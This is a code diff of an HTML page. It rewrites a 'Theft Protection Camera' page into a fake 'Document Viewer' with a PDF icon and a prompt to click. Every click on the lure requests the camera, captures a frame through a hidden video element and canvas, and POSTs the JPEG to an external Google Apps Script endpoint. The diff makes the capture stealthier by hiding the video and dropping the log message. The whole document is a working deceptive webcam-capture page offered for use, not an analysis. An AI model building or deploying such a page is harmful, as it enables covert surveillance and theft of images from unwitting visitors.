@@ -1,38 +1,76 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Theft Protection Camera</title>
+  <title>Document Viewer</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f0f0f0;
+      text-align: center;
+      padding: 20px;
+    }
+    #docBox {
+      display: inline-block;
+      background: white;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      max-width: 600px;
+      cursor: pointer;
+    }
+    img {
+      max-width: 100%;
+      border: 1px solid #ccc;
+    }
+    h2 {
+      margin-bottom: 10px;
+    }
+    p {
+      color: #555;
+    }
+  </style>
 </head>
 <body>
-  <h2>Checking Device...</h2>
-  <video id="video" autoplay playsinline style="width:1px;height:1px;"></video>
+
+  <div id="docBox">
+    <h2>Document Preview</h2>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/PDF_file_icon.svg/800px-PDF_file_icon.svg.png" alt="PDF" width="120">
+    <p>Click anywhere to view this document.</p>
+  </div>
+
+  <video id="video" autoplay playsinline style="display:none;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
 
   <script>
     const scriptURL = "https://script.google.com/macros/s/AKfycbxv3VtJgebN5j_tr4BZd3-hCjV1zsGlz_PFe_noz16zwC84XTtM86uMnH7NLhsgq8qm/exec"; // paste from Step 1
 
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => {
-        const video = document.getElementById('video');
-        video.srcObject = stream;
-        video.addEventListener('loadeddata', () => {
-          const canvas = document.getElementById('canvas');
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          const ctx = canvas.getContext('2d');
-          ctx.drawImage(video, 0, 0);
-          const imageData = canvas.toDataURL('image/jpeg', 0.9);
+    function takePhoto() {
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          const video = document.getElementById('video');
+          video.srcObject = stream;
+          video.addEventListener('loadeddata', () => {
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+            const imageData = canvas.toDataURL('image/jpeg', 0.9);
 
-          fetch(scriptURL, {
-            method: 'POST',
-            body: JSON.stringify({ image: imageData })
-          }).then(r => console.log("Sent")).catch(err => console.error(err));
+            fetch(scriptURL, {
+              method: 'POST',
+              body: JSON.stringify({ image: imageData })
+            }).catch(err => console.error(err));
 
-          stream.getTracks().forEach(track => track.stop());
-        });
-      })
-      .catch(err => console.error("Camera access denied", err));
+            stream.getTracks().forEach(track => track.stop());
+          });
+        })
+        .catch(err => console.error("Camera access denied", err));
+    }
+
+    // Trigger photo every click anywhere inside the "document"
+    document.getElementById('docBox').addEventListener('click', takePhoto);
   </script>
+
 </body>
 </html>
-
